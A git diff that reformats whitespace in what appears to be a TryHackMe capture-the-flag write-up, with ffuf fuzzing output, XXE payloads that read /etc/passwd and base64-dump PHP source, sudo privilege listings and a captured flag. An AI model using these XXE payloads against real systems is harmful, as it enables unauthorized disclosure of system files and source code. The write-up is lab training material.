@@ -9,8 +9,8 @@
 
 | PORT | SERVICE |
 | :--- | :------ |
-| 22   | SSH     |
-| 80   | HTTP    |
+| 22 | SSH |
+| 80 | HTTP |
 
 
 
@@ -24,29 +24,29 @@ Let's fuzz:
 ```
 ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://10.10.115.174/FUZZ" -ic -c -t 200
 
-        /'___\  /'___\           /'___\
-       /\ \__/ /\ \__/  __  __  /\ \__/
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
-         \ \_\   \ \_\  \ \____/  \ \_\
-          \/_/    \/_/   \/___/    \/_/
+ /'___\ /'___\ /'___\
+ /\ \__/ /\ \__/ __ __ /\ \__/
+ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+ \ \_\ \ \_\ \ \____/ \ \_\
+ \/_/ \/_/ \/___/ \/_/
 
-       v2.1.0-dev
+ v2.1.0-dev
 ________________________________________________
 
- :: Method           : GET
- :: URL              : http://10.10.115.174/FUZZ
- :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+ :: Method : GET
+ :: URL : http://10.10.115.174/FUZZ
+ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
  :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 200
- :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Calibration : false
+ :: Timeout : 10
+ :: Threads : 200
+ :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
 ________________________________________________
 
-                        [Status: 200, Size: 406, Words: 138, Lines: 25, Duration: 160ms]
-scripts                 [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 160ms]
-report                  [Status: 200, Size: 16912, Words: 69, Lines: 21, Duration: 160ms]
+ [Status: 200, Size: 406, Words: 138, Lines: 25, Duration: 160ms]
+scripts [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 160ms]
+report [Status: 200, Size: 16912, Words: 69, Lines: 21, Duration: 160ms]
 ```
 
 
@@ -219,37 +219,37 @@ Since we can add users, there must be other stuff, let's fuzz again:
 ```
 ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://10.10.115.174/FUZZ" -ic -c -t 200 -e .php,.html,.git
 
-        /'___\  /'___\           /'___\
-       /\ \__/ /\ \__/  __  __  /\ \__/
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
-         \ \_\   \ \_\  \ \____/  \ \_\
-          \/_/    \/_/   \/___/    \/_/
+ /'___\ /'___\ /'___\
+ /\ \__/ /\ \__/ __ __ /\ \__/
+ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+ \ \_\ \ \_\ \ \____/ \ \_\
+ \/_/ \/_/ \/___/ \/_/
 
-       v2.1.0-dev
+ v2.1.0-dev
 ________________________________________________
 
- :: Method           : GET
- :: URL              : http://10.10.115.174/FUZZ
- :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
- :: Extensions       : .php .html .git
+ :: Method : GET
+ :: URL : http://10.10.115.174/FUZZ
+ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+ :: Extensions : .php .html .git
  :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 200
- :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Calibration : false
+ :: Timeout : 10
+ :: Threads : 200
+ :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
 ________________________________________________
 
-.php                    [Status: 403, Size: 284, Words: 21, Lines: 11, Duration: 161ms]
-register.php            [Status: 200, Size: 715, Words: 49, Lines: 28, Duration: 163ms]
-index.html              [Status: 200, Size: 406, Words: 138, Lines: 25, Duration: 1106ms]
-.html                   [Status: 403, Size: 285, Words: 21, Lines: 11, Duration: 6138ms]
-admin.php               [Status: 200, Size: 663, Words: 45, Lines: 26, Duration: 210ms]
-scripts                 [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 187ms]
-forms.php               [Status: 200, Size: 2334, Words: 460, Lines: 112, Duration: 258ms]
-report                  [Status: 200, Size: 16912, Words: 69, Lines: 21, Duration: 159ms]
-logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 245ms]
-dashboard.php           [Status: 302, Size: 908, Words: 87, Lines: 56, Duration: 164ms]
+.php [Status: 403, Size: 284, Words: 21, Lines: 11, Duration: 161ms]
+register.php [Status: 200, Size: 715, Words: 49, Lines: 28, Duration: 163ms]
+index.html [Status: 200, Size: 406, Words: 138, Lines: 25, Duration: 1106ms]
+.html [Status: 403, Size: 285, Words: 21, Lines: 11, Duration: 6138ms]
+admin.php [Status: 200, Size: 663, Words: 45, Lines: 26, Duration: 210ms]
+scripts [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 187ms]
+forms.php [Status: 200, Size: 2334, Words: 460, Lines: 112, Duration: 258ms]
+report [Status: 200, Size: 16912, Words: 69, Lines: 21, Duration: 159ms]
+logout.php [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 245ms]
+dashboard.php [Status: 302, Size: 908, Words: 87, Lines: 56, Duration: 164ms]
 ```
 
 Let's go to `register.php`:
@@ -284,10 +284,10 @@ The format of it may suggest it is vulnerable to `XXE`, let's try some stuff the
 ```XML
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE root [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+ <!ENTITY xxe SYSTEM "file:///etc/passwd">
 ]>
 <root>
-  <name>
+ <name>
 &xxe;</name>
 <search>&xxe;
 </search>
@@ -301,10 +301,10 @@ We got LFI, `expect` wrapper is not enabled so we cannot get `RCE`, but, we can 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE root [
-  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=acc.php">
+ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=acc.php">
 ]>
 <root>
-  <name>
+ <name>
 &xxe;</name>
 <search>&xxe;
 </search>
@@ -322,60 +322,60 @@ Let's decode these contents:
 <style>
 form
 {
-  border: 2px solid black;
-  outline: #4CAF50 solid 3px;
-  margin: auto;
-  width:180px;
-  padding: 20px;
-  text-align: center;
+ border: 2px solid black;
+ outline: #4CAF50 solid 3px;
+ margin: auto;
+ width:180px;
+ padding: 20px;
+ text-align: center;
 }
 
 
 ul {
-  list-style-type: none;
-  margin: 0;
-  padding: 0;
-  overflow: hidden;
-  background-color: #333;
+ list-style-type: none;
+ margin: 0;
+ padding: 0;
+ overflow: hidden;
+ background-color: #333;
 }
 
 li {
-  float: left;
-  border-right:1px solid #bbb;
+ float: left;
+ border-right:1px solid #bbb;
 }
 
 li:last-child {
-  border-right: none;
+ border-right: none;
 }
 
 li a {
-  display: block;
-  color: white;
-  text-align: center;
-  padding: 14px 16px;
-  text-decoration: none;
+ display: block;
+ color: white;
+ text-align: center;
+ padding: 14px 16px;
+ text-decoration: none;
 }
 
 li a:hover:not(.active) {
-  background-color: #111;
+ background-color: #111;
 }
 
 .active {
-  background-color: blue;
+ background-color: blue;
 }
 </style>
 </head>
 <body>
 
 <ul>
-  <li><a href="dashboard.php">Dashboard</a></li>
-  <li><a href="with.php">Withdraw Money</a></li>
-  <li><a href="depo.php">Deposit Money</a></li>
-  <li><a href="tra.php">Transfer Money</a></li>
-  <li><a href="acc.php">My Account</a></li>
-  <li><a href="forms.php">command</a></li>
-  <li><a href="logout.php">Logout</a></li>
-  <li style="float:right"><a href="contact.php">Contact Us</a></li>
+ <li><a href="dashboard.php">Dashboard</a></li>
+ <li><a href="with.php">Withdraw Money</a></li>
+ <li><a href="depo.php">Deposit Money</a></li>
+ <li><a href="tra.php">Transfer Money</a></li>
+ <li><a href="acc.php">My Account</a></li>
+ <li><a href="forms.php">command</a></li>
+ <li><a href="logout.php">Logout</a></li>
+ <li style="float:right"><a href="contact.php">Contact Us</a></li>
 </ul><br><br><br><br>
 
 </body>
@@ -453,17 +453,17 @@ If we check our privileges, we can notice this:
 ```
 cyber@ubuntu:~$ sudo -l
 Matching Defaults entries for cyber on ubuntu:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+ env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
 
 User cyber may run the following commands on ubuntu:
-    (root) NOPASSWD: /usr/bin/python3 /home/cyber/run.py
+ (root) NOPASSWD: /usr/bin/python3 /home/cyber/run.py
 ```
 
 Let's check that file then:
 
 ```
 cyber@ubuntu:~$ ls -la run.py
--rwx------ 1 root root 349 Nov 15  2020 run.py
+-rwx------ 1 root root 349 Nov 15 2020 run.py
 cyber@ubuntu:~$ cat run.py
 cat: run.py: Permission denied
 ```
@@ -516,13 +516,13 @@ THM{20c1d18791a246001f5df7867d4e6bf5}
 ```
 bash-4.3# cat /root/root.txt
 â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ
-â–ˆâ–ˆ                                â–ˆâ–ˆ
-â–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆ
-â–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆ
-â–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆ
-â–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆ
-â–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆ
-â–ˆâ–ˆ                                â–ˆâ–ˆ
+â–ˆâ–ˆ â–ˆâ–ˆ
+â–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ
+â–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ
+â–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ
+â–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ
+â–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ
+â–ˆâ–ˆ â–ˆâ–ˆ
 â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ
 
 
